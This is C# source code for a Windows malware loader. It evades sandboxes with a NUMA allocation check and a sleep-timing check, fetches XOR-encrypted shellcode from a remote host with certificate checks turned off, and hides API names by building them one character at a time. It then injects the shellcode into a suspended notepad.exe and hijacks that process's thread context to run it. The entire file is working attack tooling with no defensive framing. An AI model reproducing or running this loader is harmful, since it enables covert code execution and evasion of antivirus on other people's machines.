using System;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

using static hollow.Native;

namespace hollow
{
    internal class Program
    {
        internal static async Task Main(string[] args)
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == IntPtr.Zero)
                return;

            DateTime t1 = DateTime.Now;
            Sleep(5000);
            if (DateTime.Now.Subtract(t1).TotalSeconds < 4.5)
                return;

            byte[] banana;
            using (var handler = new HttpClientHandler())
            {
                handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;
                using (var client = new HttpClient(handler))
                    banana = await client.GetByteArrayAsync("http://<IP>/<xor'ed_binary_shellcode>");
            }

            for (int i = 0; i < banana.Length; i++)
                banana[i] = (byte)(banana[i] ^ (byte)'z');

            var k32 = new string(new char[] { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l' });
            var virtualAllocEx  = GetExport<VirtualAllocExDelegate>   (k32, new string(new char[] { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 'E', 'x' }));
            var writeProcessMem = GetExport<WriteProcessMemoryDelegate>(k32, new string(new char[] { 'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y' }));
            var getThreadCtx    = GetExport<GetThreadContextDelegate>  (k32, new string(new char[] { 'G', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't', 'e', 'x', 't' }));
            var setThreadCtx    = GetExport<SetThreadContextDelegate>  (k32, new string(new char[] { 'S', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't', 'e', 'x', 't' }));
            var resumeThread    = GetExport<ResumeThreadDelegate>      (k32, new string(new char[] { 'R', 'e', 's', 'u', 'm', 'e', 'T', 'h', 'r', 'e', 'a', 'd' }));

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            var target = new string(new char[] { 'c', ':', '\\', 'w', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e' });
            CreateProcess(null, target, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            IntPtr pHandle = pi.hProcess;

            IntPtr shellcodeAddr = virtualAllocEx(pHandle, IntPtr.Zero, (uint)banana.Length, 0x3000, 0x40);
            if (shellcodeAddr == IntPtr.Zero)
                return;

            IntPtr bytesWritten = IntPtr.Zero;
            if (!writeProcessMem(pHandle, shellcodeAddr, banana, banana.Length, out bytesWritten))
                return;

            // GetThreadContext requires a 16-byte-aligned buffer; Marshal it manually
            IntPtr ctxBuf = Marshal.AllocHGlobal(1232 + 16);
            IntPtr ctx = new IntPtr((ctxBuf.ToInt64() + 15) & ~15L);
            Marshal.WriteInt32(ctx, 0x30, (int)CONTEXT_FULL);

            if (!getThreadCtx(pi.hThread, ctx))
            {
                Marshal.FreeHGlobal(ctxBuf);
                return;
            }
            Marshal.WriteInt64(ctx, 0xF8, shellcodeAddr.ToInt64());
            if (!setThreadCtx(pi.hThread, ctx))
            {
                Marshal.FreeHGlobal(ctxBuf);
                return;
            }
            Marshal.FreeHGlobal(ctxBuf);

            resumeThread(pi.hThread);
        }
    }
}
